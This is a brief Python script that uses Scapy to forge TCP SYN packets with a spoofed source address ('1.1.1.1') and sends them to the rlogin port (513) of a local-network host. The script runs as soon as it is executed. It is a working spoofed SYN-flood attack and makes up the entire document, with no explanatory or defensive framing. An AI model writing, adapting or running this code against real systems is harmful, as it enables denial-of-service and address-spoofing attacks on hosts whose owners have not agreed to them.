from scapy.all import *


def syn_flood(src, tgt):
    for sport in range(1024, 1030):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

src = '1.1.1.1'
dst = '192.168.1.45'
syn_flood(src, dst)
